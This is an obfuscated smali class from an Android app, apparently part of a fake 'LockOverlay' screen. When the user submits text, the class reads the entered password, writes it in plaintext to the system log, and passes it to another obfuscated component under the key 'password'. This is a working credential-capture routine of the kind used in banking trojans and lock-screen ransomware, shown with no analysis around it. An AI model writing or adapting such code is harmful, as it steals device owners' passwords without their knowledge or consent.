.class public final Lڝږ؁ڋ/س;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Landroid/widget/TextView$OnEditorActionListener;


# instance fields
.field public final synthetic ؋:Landroid/widget/EditText;

.field public final synthetic ؠ:Lڝږ؁ڋ/ظ;


# direct methods
.method public constructor <init>(Lڝږ؁ڋ/ظ;Landroid/widget/EditText;)V
    .locals 0

    iput-object p1, p0, Lڝږ؁ڋ/س;->ؠ:Lڝږ؁ڋ/ظ;

    iput-object p2, p0, Lڝږ؁ڋ/س;->؋:Landroid/widget/EditText;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final onEditorAction(Landroid/widget/TextView;ILandroid/view/KeyEvent;)Z
    .locals 2

    const/4 p1, 0x6

    if-eq p2, p1, :cond_0

    const/4 p1, 0x2

    if-eq p2, p1, :cond_0

    const/4 p1, 0x5

    if-eq p2, p1, :cond_0

    const/4 p1, 0x0

    return p1

    :cond_0
    iget-object p1, p0, Lڝږ؁ڋ/س;->؋:Landroid/widget/EditText;

    invoke-virtual {p1}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object p1

    if-eqz p1, :cond_1

    invoke-virtual {p1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object p1

    goto :goto_0

    :cond_1
    const-string p1, ""

    :goto_0
    const-string p2, "[PASSWORD] Submitted: "

    const-string p3, " (length="

    invoke-static {p2, p1, p3}, Landroidx/activity/result/؋;->ث(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p2

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result p3

    invoke-virtual {p2, p3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string p3, ")"

    invoke-virtual {p2, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    const-string p3, "LockOverlay"

    invoke-static {p3, p2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    iget-object p2, p0, Lڝږ؁ڋ/س;->ؠ:Lڝږ؁ڋ/ظ;

    iget-object p3, p2, Lڝږ؁ڋ/ظ;->أ:Lژة۪ڦضۆۿۡ/ح;

    if-eqz p3, :cond_2

    const-string p3, "password"

    invoke-static {p3, p1}, Lژة۪ڦضۆۿۡ/ح;->؋(Ljava/lang/String;Ljava/lang/String;)V

    :cond_2
    iget-object p1, p2, Lڝږ؁ڋ/ظ;->ؤ:Landroid/os/Handler;

    new-instance p2, Landroidx/constraintlayout/helper/widget/؋;

    const/16 p3, 0x17

    invoke-direct {p2, p3, p0}, Landroidx/constraintlayout/helper/widget/؋;-><init>(ILjava/lang/Object;)V

    const-wide/16 v0, 0x1f4

    invoke-virtual {p1, p2, v0, v1}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    const/4 p1, 0x1

    return p1
.end method
